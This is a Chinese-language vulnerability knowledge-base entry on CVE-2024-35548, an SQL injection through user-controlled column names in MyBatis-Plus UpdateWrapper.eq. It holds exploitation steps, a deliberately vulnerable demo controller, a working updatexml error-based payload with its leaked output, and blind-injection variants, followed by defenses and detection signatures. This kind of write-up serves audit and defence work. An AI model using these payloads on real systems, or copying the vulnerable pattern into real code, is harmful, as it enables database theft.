---
id: web-java-framework-mybatis-plus-updatewrapper-column-sqli
title: MyBatis-Plus ≤3.5.6 UpdateWrapper.eq 列名未过滤：用户可控列名直拼 WHERE 触发 SQL 注入（CVE-2024-35548）
type: scenario
domain: web
path: web/java/framework
technique: updatewrapper-column-name-sqli
tags:
- java
- mybatis-plus
- sqli
- wrapper
- column-name
- updatexml
- error-based
- cve-2024-35548
cve:
- CVE-2024-35548
affected_versions: mybatis-plus@(-∞, 3.5.6]；com.baomidou:mybatis-plus-core@(-∞, 3.5.6]
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V362
  verified_at: '2026-11-09T02:53:34+08:00'
  notes: 已对照原文与6张图片核对：受影响版本 mybatis-plus(-∞,3.5.6] 原文明确、CVE-2024-35548、eq 列名直拼、payload 1=1) and updatexml... and (1 闭合、日志与500报错回显均一致；卡内无 sources/文章ID/长段摘录，路径合法。未验证点：原文仅演示 MySQL updatexml 报错注入，布尔/时间盲注与 QueryWrapper 变体为合理推演未实测。
url: /docs/web/java/framework/web-java-framework-mybatis-plus-updatewrapper-column-sqli/
draft: false
kb_aliases:
- CVE-2024-35548
- MyBatis-Plus SQL注入
- UpdateWrapper.eq 注入
- Wrapper 列名注入
- eq 第一个参数注入
---

## 一句话结论

当业务代码把用户可控输入传给 `UpdateWrapper.eq(column, value)`（以及 QueryWrapper 同类条件方法）的第一个参数（列名）时，MyBatis-Plus（原文标注影响 ≤3.5.6）不会对列名做白名单过滤，列名原样拼进 `WHERE (列名 = ?)` 的 SQL 文本，攻击者用 `1=1) and updatexml(...) and (1` 闭合 Wrapper 自动添加的括号，即可在 UPDATE 语句位置做报错注入或布尔盲注，读取数据库内容。

## 原理

- Wrapper 条件方法签名是 `eq(R column, Object val)`。生成 SQL 时，列名是 SQL 标识符，JDBC 无法用 `?` 占位符绑定，只能作为文本拼接；只有 `val` 走 `#{}` 预编译参数。原文日志可见最终语句为 `UPDATE user SET age=? WHERE (name = ?)`：值有占位符，列名 `name` 是裸文本。
- 若应用把请求参数当列名（如 `updateWrapper.eq(param, "Yu9")`），列名位置就变成 SQL 注入点。Wrapper 在条件外自动加一层括号并追加 ` = ?`，因此 payload 先用 `)` 闭合左括号，再用 `and (1` 吞掉末尾的 `= ?`。
- 以 payload `1=1) and updatexml(1,concat(0x7e,database()),0) and (1` 为例，最终拼接为 `UPDATE user SET age=? WHERE (1=1) and updatexml(1,concat(0x7e,database()),0) and (1 = ?)`。MySQL 的 `updatexml` 第二参数不是合法 XPath，抛出 `XPATH syntax error: '~<database()>~'`，数据库错误随响应/日志回显，构成报错注入 oracle；同理可用 `extractvalue`。
- 影响面不止 `eq`：`ne/gt/ge/lt/le/like/in`、`orderByAsc/orderByDesc`、`last/apply` 等 Wrapper 方法的列名或原生 SQL 参数同样不经过预编译。只要用户输入能到达这些位置，就等价于 SQL 拼接。
- 与 Mapper XML 中 `${}` 不同，这个注入点不在 SQL 模板里，而在框架 API 的“列名”形参上；代码审计时应按 `.eq(`、`.orderBy` 等调用第一个参数的来源排查。

## 触发条件

- 应用中存在把用户可控输入传给 Wrapper 条件方法列名参数的代码（动态过滤/排序字段、通用查询组件等）。
- 原文标注受影响版本：mybatis-plus / mybatis-plus-core ≤ 3.5.6；使用 `QueryWrapper`/`UpdateWrapper` 等字符串列名 API 且未对列名做白名单。
- 数据库为 MySQL 时可用 `updatexml`/`extractvalue` 报错注入；其他数据库需换用对应报错或盲注技巧。
- 若业务对列名做了枚举白名单校验，或使用 `LambdaQueryWrapper`/`LambdaUpdateWrapper`（列名由方法引用映射，不接收用户字符串），则不受影响。

## 利用步骤

1. 定位入口：寻找把请求参数当字段名/排序字段传入 Wrapper 的接口，如 `updateWrapper.eq(param, value)`、`queryWrapper.orderByDesc(param)`。
2. 探测：把列名换成不存在的合法标识符（如 `xxx`），观察 SQL 日志/错误页，确认列名被直接拼入；原文案例 `param=xxx` 返回 500，日志出现 `WHERE (xxx = ?)`。
3. 构造闭合：针对 `WHERE (<column> = ?)`，payload 用 `)` 结束自动左括号，末尾补 `and (1` 平衡右括号与 `= ?`。
4. 报错注入：提交 `param=1=1) and updatexml(1,concat(0x7e,database()),0) and (1`，从 `XPATH syntax error: '~库名'` 读取当前库名；把 `database()` 换成 `user()`、`version()` 或子查询继续取表名、列名和数据。
5. 无报错回显时改用布尔盲注：让 payload 控制 `1=1`/`1=2` 分支，以 UPDATE 影响行数或响应差异作为 oracle；或使用时间盲注（`sleep()` 需按语句结构闭合）。

## PoC

最小 demo（Controller 把 `param` 当列名）：

```java
@GetMapping("/test")
public String updateAgeByName(@RequestParam(defaultValue = "name") String param) {
    User user = new User();
    user.setAge(18);
    UpdateWrapper<User> wrapper = new UpdateWrapper<>();
    wrapper.eq(param, "Yu9");   // param 用户可控，进入列名位置
    userMapper.update(user, wrapper);
    return "Update success!";
}
```

正常请求生成的 SQL：

```sql
UPDATE user SET age=? WHERE (name = ?)
-- Parameters: 18(Integer), Yu9(String)
```

注入请求：

```http
GET /test?param=1%3D1)%20and%20updatexml(1%2Cconcat(0x7e%2Cdatabase())%2C0)%20and%20(1 HTTP/1.1
Host: 127.0.0.1:8080
```

拼接后的 SQL 与报错：

```sql
UPDATE user SET age=? WHERE (1=1) and updatexml(1,concat(0x7e,database()),0) and (1 = ?)
-- Parameters: 18(Integer), Yu9(String)
-- java.sql.SQLException: XPATH syntax error: '~test'
```

原文案例的数据库名为 `test`，报错随 HTTP 500 响应回显，可用于继续逐段取数。

## 变体与关联

- 变体：`QueryWrapper` 查询条件同样把列名当文本拼接，SELECT 场景可用 `and 1=1`/`and 1=2` 做布尔盲注或视拼接位置尝试 `union`。
- 变体：`orderByAsc/orderByDesc(param)` 把用户输入拼进 ORDER BY，属同一类“Wrapper 文本位拼接”，无需括号闭合，注入更直接。
- 变体：`apply("...")`、`last("...")` 本身就是原生 SQL 拼接接口，混入用户输入时同等危险。
- 关联：[[web-generic-sqli-mybatis-dollar-brace-injection]]（Mapper `${}` 文本替换注入，同属“非参数化位置拼接”，但位置不同）。
- 关联：[[web-generic-sqli-fastcms-article-list-orderby-injection]]（MyBatis-Plus orderByDesc 拼入 `${ew.customSqlSegment}` 的 ORDER BY 注入案例）。
- 关联：[[web-generic-sqli-error-based-extraction]]（updatexml/extractvalue 报错注入取数技巧）。
- 边界：列名位置对特殊字符的容忍度取决于语句结构，payload 需按目标 SQL 微调闭合方式；能否注入最终取决于业务是否真的把用户输入放进了列名参数，属于框架 API 误用型问题。

## 检测与防御

- 代码层：禁止把用户输入传给 Wrapper 的列名/排序参数；字段名到列名用白名单枚举映射，未知值直接拒绝。
- 优先使用 `LambdaQueryWrapper`/`LambdaUpdateWrapper` 与实体方法引用（如 `User::getName`），从类型上避免字符串列名。
- `orderByAsc/orderByDesc`、`apply`、`last` 等原生拼接接口一律不接受外部输入；确实需要动态排序时只允许枚举值。
- 组件层：按原文影响范围将 mybatis-plus / mybatis-plus-core 升级到 3.5.6 之后版本，并回归所有动态列名调用点。
- 错误处理：统一异常响应，禁止把 `SQLException`、`XPATH syntax error` 等数据库错误回显给前端。
- 检测特征：请求参数中出现 `updatexml(`、`extractvalue(`、`concat(0x7e`、`sleep(`、`) and (` 等片段；应用日志中 `WHERE (` 后紧跟非常规标识符或函数调用；同一接口对字段名参数做 fuzz。
